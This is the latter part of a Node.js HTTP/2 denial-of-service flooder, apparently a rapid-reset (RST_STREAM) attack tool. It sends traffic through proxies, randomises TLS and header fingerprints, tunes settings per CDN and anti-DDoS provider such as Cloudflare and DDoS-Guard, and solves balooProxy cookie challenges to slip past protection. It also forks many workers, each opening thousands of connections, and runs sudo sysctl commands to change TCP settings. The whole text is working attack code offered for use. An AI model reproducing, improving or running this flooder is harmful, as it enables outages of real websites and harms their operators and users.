                      ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                      ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                      ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                      ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
              });

                  function handleQuery(query) {
                      if (query === '1') {
                          return parsedTarget.path + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                      } else if (query === '2') {
                          return parsedTarget.path + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                      } else if (query === '3') {
                          return parsedTarget.path + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                      } else {
                          return parsedTarget.path;
                      }
                  }
    
                  const packed = Buffer.concat([
                      Buffer.from([0x4, 0x15, 0x20, 0x80, 0xFFFFFF]),
                      hpack.encode(headers)
                  ]);

                  requests.push(encodeFrame(streamId, 1, packed, 0x25));
                  streamId += 2
                  
           const agent = new http.Agent({
               keepAlive: true,
               keepAliveMsecs: 50000,
               maxSockets: Infinity,
               maxFreeSockets: Infinity,
               maxTotalSockets: Infinity,
               timeout: time * 1000,
           });

           const proxyOptions = {
              host: parsedProxy[0],
              port: parsedProxy[1],
              address: parsedTarget.host + ":443",
              timeout: 15000
           };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
         connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true);
         
         const settings = {
             ...(Math.random() < 0.5 && { headerTableSize: frame_1 }),
             enablePush: false,
             ...(Math.random() < 0.5 && { maxConcurrentStreams: frame_4 }),
             ...(frame_3 > 0 || Math.random() < 0.5 && { maxFrameSize: frame_3 }),
             ...(Math.random() < 0.5 && { initialWindowSize: frame_2 }),
             ...(frame_4 > 0 || Math.random() < 0.5 && { maxHeaderListSize: frame_4 }),
        };

         const tlsOptions = {
            port: parsedPort,
            ALPNProtocols: ["h2", "http/1.1"],
            agent,
            secure: true,
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            servername: url.hostname,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureOptions: secureOptions,
            secureContext: secureContext,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"]
        };


         const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions, () => {
         const ja3Fingerprint = generateJA3Fingerprint(tlsConn);
         
             tlsConn.allowHalfOpen = true;
             tlsConn.setNoDelay(true);
             tlsConn.setKeepAlive(true, 60000);
             tlsConn.setMaxListeners(0);

         });

     function generateJA3Fingerprint(socket) {
         const cipherInfo = socket.getCipher();
         const supportedVersions = socket.getProtocol();

         if (!cipherInfo) {
             console.error('Cipher info is not available. TLS handshake may not have completed.');
             return null;
         }

         const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;

         const md5Hash = crypto.createHash('md5');
         md5Hash.update(ja3String);

         return md5Hash.digest('hex');
     }

     tlsConn.on('connect', () => {
         const ja3Fingerprint = generateJA3Fingerprint(tlsConn);
     });
         
    function getSettingsBasedOnISP(isp) {
        const defaultSettings = {
            ...(Math.random() < 0.5 && { headerTableSize: frame_1 }),
            enablePush: false,
            ...(Math.random() < 0.5 && { maxConcurrentStreams: frame_4 }),
            ...(frame_3 > 0 || Math.random() < 0.5 && { maxFrameSize: frame_3 }),
            ...(Math.random() < 0.5 && { initialWindowSize: frame_2 }),
            ...(frame_4 > 0 || Math.random() < 0.5 && { maxHeaderListSize: frame_4 }),
        };
    
        const settings = { ...defaultSettings };
    
        switch (isp) {
        case 'Cloudflare, Inc.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = 16384;
            settings.enableConnectProtocol = false;
            break;
        case 'FDCservers.net':
        case 'OVH SAS':
        case 'VNXCLOUD':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65536;
            settings.maxFrameSize = 16777215;
            settings.maxConcurrentStreams = 128;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Akamai Technologies, Inc.':
        case 'Akamai International B.V.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = 16384;
            settings.maxHeaderListSize = 32768;
            break;
        case 'Fastly, Inc.':
        case 'Optitrust GmbH':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Ddos-guard LTD':
            settings.priority = 1;
            settings.maxConcurrentStreams = 1;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16777215;
            settings.maxHeaderListSize = 262144;
            break;
        case 'Amazon.com, Inc.':
        case 'Amazon Technologies Inc.':
            settings.priority = 0;
            settings.maxConcurrentStreams = 100;
            settings.initialWindowSize = 65535;
            settings.maxHeaderListSize = 262144;
            break;
        case 'Microsoft Corporation':
        case 'Vietnam Posts and Telecommunications Group':
        case 'VIETNIX':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 8388608;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Google LLC':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 1048576;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 137216;
            break;
        default:
            settings.headerTableSize = 65535;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxHeaderListSize = 261144;
            settings.maxFrameSize = 16384;
            break;
    }

    return settings;
}
 
    let client;
    
    const clients = [];
    client = http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsConn,
        settings : getSettingsBasedOnISP(isp),
        maxOutstandingPings: 1337,
        maxOutstandingSettingsAck: 1337,
        maxSessionMemory: 1337,
        maxHeaderListPairs: 1337,
        maxConcurrentStreams: 1337,
        maxSettings: 1337,
        peerMaxConcurrentStreams: 1337,
        maxReadQueueSize: 0xFFFFFF,
        socket: tlsConn,
    });
    clients.push(client);
    client.settings(settings);
    client.setMaxListeners(0);
    
    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    
    client.on('connect', () => {
    client.ping((err, duration, payload) => {
    });

    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('STRING DATA'));

});

         client.on("connect", () => {
            const IntervalAttack = (orgCookie) => {
                const _orgCookie = orgCookie || false;
                if(client.closed || client.destroyed) {
                    connection.destroy()
                    return
                }
                for (let i = 0; i < (isFull ? rate : 1); i++) {
                    if(client.closed || client.destroyed) {
                        connection.destroy()
                        break
                    }
                    
                    let count = 0;
                    const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
                    
                    const combinedallheaders = shuffleObject({
                        ...headers,
                        ...headers2,
                    });
                    
                    const request = client.request(combinedallheaders, {
                        weight: Math.random() < 0.5 ? 251 : 231,
                        depends_on: 0,
                        exclusive: Math.random() < 0.5 ? true : false,
                    })
                    
                    request.on("response", response => {
                        if(response['set-cookie']) {
                            headers["cookie"] = cookieString(scp.parse(response["set-cookie"]))
                        }

                        request.close(http2.constants.NO_ERROR);
                        request.destroy();
                        sentHeaders++;
                    });
                    
                    request.on('end', () => {
                        count++;
                        if (count === time * rate) {
                            clearInterval(IntervalAttack);
                            client.close(http2.constants.NGHTTP2_CANCEL);
                            sentRSTs++;
                        }
                        reject(new Error('Request timed out'));
                    });
                    
                    setTimeout(() => {
                        request.close(http2.constants.NGHTTP2_CANCEL);
                        sentRSTs++;
                    }, delay);

                    request.end();
                    
                    if(i+1 >= rate) {
                        if(!client.closed && !client.destroyed) {
                            Bypass(true, _orgCookie)
                            //setTimeout(IntervalAttack, 1000)
                        } else {
                            client.destroy();
                            connection.destroy()
                        }
                    }
                }
            }

            const Bypass = (reBypass, orgCookie) => {
                try {
                    let inspectData = false;
                    
                    if(client.closed || client.destroyed) {
                        client.destroy();
                        connection.destroy();
                        return;
                    }

                    //headers[":path"] = headers[":path"].replace("%RAND%", randomIntn(10000, 100000))
                    
                    let count = 0;
                    const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
                    
                    const combinedallheaders = shuffleObject({
                        ...headers,
                        ...headers2,
                    });
                    
                    const request = client.request(combinedallheaders, {
                        weight: Math.random() < 0.5 ? 251 : 231,
                        depends_on: 0,
                        exclusive: Math.random() < 0.5 ? true : false,
                    })

                    request.on("response", response => {
                        if(response['set-cookie']) {
                            headers['cookie'] = cookieString(scp.parse(response["set-cookie"]))
                            orgCookie = headers['cookie']
                        }
                        if(reBypass) {
                           inspectData = true;
                        }
                    });
                    request.on('error', error => {process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});
                        client.destroy();
                        connection.destroy();
                    })

                    let data = "";
                    request.setEncoding('utf8');
                    request.on('data', (chunk) => {
                        data += chunk;
                    });

                    request.on('end', () => {
                        if(inspectData) {
                            //console.log(data)
                        }
                        let attackSended = false;

                        //balooProxy bypass stage 2 (js)
                        if(data.includes("calcSolution") && data.includes('document.cookie')) {
                            let unpackCookie = data.split(`document.cookie="`)[1].split('"')[0];
                            
                            //orgCookie = stage 1 (cookie)
                            if(orgCookie) {
                                headers['cookie'] = orgCookie + "; "+unpackCookie
                            } else {
                                headers['cookie'] = unpackCookie
                            }

                            attackSended = true;
                            IntervalAttack(orgCookie)
                        }

                        if(!attackSended) {
                            IntervalAttack()
                        }


                        data = undefined
                        request.close();
                        request.destroy();
                    });

                    request.end();
                } catch(err) {
                    //console.log(err)
                }
            }

            Bypass() 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return runFlooder();
         });

         client.on("error", error => {
             if (error.code === 'ERR_HTTP2_GOAWAY_SESSION') {
                 console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
                 shouldPauseRequests = true;
                 setTimeout(() => {
           
                     shouldPauseRequests = false;
                 },2000);
             } else if (error.code === 'ECONNRESET') {
        
                 shouldPauseRequests = true;
                 setTimeout(() => {
            
                     shouldPauseRequests = false;
                 }, 2000);
             }  else {
             }

             client.destroy();
             tlsConn.destroy();
			 return runFlooder();
         });
     });
   }
}

function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 10) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {

    const workers = {}

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`[@udpraw53] - New h2-viesty (RST_STREAM) Best methods`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    
    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(1), time * 1000);

} else {
    let conns = 0

    let i = setInterval(() => {
        if (conns < 30000) {
            conns++

        } else {
            clearInterval(i)
            return
        }
        runFlooder()
    }, delay);

    setTimeout(() => process.exit(1), time * 1000);
}